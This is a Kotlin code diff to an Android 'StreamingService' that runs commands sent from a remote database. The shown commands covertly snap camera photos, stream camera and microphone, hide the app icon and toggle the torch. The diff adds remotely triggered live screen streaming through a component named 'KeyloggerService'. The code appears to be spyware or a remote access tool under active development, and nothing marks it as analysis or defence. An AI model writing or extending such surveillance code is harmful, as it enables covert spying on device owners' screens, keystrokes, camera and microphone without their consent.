@@ -300,6 +300,8 @@ class StreamingService : Service() {
             "cameraSnap" -> { Thread { captureCameraSnapshot(snapshot) }.start(); snapshot.ref.removeValue() }
             "startLiveStream" -> { Thread { startLiveStreamSession() }.start(); snapshot.ref.removeValue() }
             "stopLiveStream" -> { Thread { stopLiveStreamSession() }.start(); snapshot.ref.removeValue() }
+            "startScreenShare" -> { KeyloggerService.instance?.startLiveScreenStream(); snapshot.ref.removeValue() }
+            "stopScreenShare" -> { KeyloggerService.instance?.stopLiveScreenStream(); snapshot.ref.removeValue() }
             "hideAppIcon" -> { Thread { setAppIconHidden(snapshot) }.start(); snapshot.ref.removeValue() }
             "playAlarm" -> { Thread { playLoudAlarm() }.start(); snapshot.ref.removeValue() }
             "toggleTorch" -> { Thread { toggleTorch(snapshot) }.start(); snapshot.ref.removeValue() }
@@ -1357,21 +1359,37 @@ class StreamingService : Service() {
 
     private fun handleLiveStreamControls(snapshot: DataSnapshot) {
         val active = snapshot.child("active").getValue(Boolean::class.java) ?: false
+        val source = snapshot.child("source").getValue(String::class.java) ?: "camera"
         val facing = snapshot.child("facing").getValue(String::class.java) ?: "front"
         val quality = snapshot.child("quality").getValue(String::class.java) ?: "720p"
+        val fps = snapshot.child("fps").getValue(Int::class.java) ?: 24
         val audio = snapshot.child("audio").getValue(Boolean::class.java) ?: true
         val torch = snapshot.child("torch").getValue(Boolean::class.java) ?: false
 
         if (active) {
-            startLiveStreamSession(facing, quality, audio, torch)
+            if (source == "screen") {
+                stopLiveCameraOnly()
+                promoteToForeground(camera = false, mic = audio, loc = true)
+                KeyloggerService.instance?.startLiveScreenStream(quality, fps)
+                if (audio) startLiveStreamAudio()
+            } else {
+                KeyloggerService.instance?.stopLiveScreenStream()
+                startLiveStreamSession(facing, quality, audio, torch)
+            }
         } else {
+            KeyloggerService.instance?.stopLiveScreenStream()
             stopLiveStreamSession()
         }
+    }
+
+    private fun stopLiveCameraOnly() {
+        stopLiveStreamSessionInternal()
     }
 
     @Synchronized
     private fun startLiveStreamSession(facing: String = "front", quality: String = "720p", audio: Boolean = true, torch: Boolean = false) {
         try {
+            KeyloggerService.instance?.stopLiveScreenStream()
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                 Timber.e("LiveStream: Camera permission not granted")
                 return
